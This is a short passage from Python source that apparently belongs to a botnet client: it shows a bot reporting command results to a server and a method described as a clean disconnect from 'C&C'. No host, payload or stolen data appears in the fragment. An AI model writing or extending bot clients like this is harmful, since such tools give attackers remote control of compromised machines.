            'type': 'command_result',
            'bot_id': self.bot_id,
            'cmd_id': cmd_id,
            'result': result,
            'timestamp': datetime.now().isoformat()
        }

        self.send_message(result_message)

    def disconnect(self):
        """Clean disconnect from C&C"""
        self.running = False
        if self.socket:
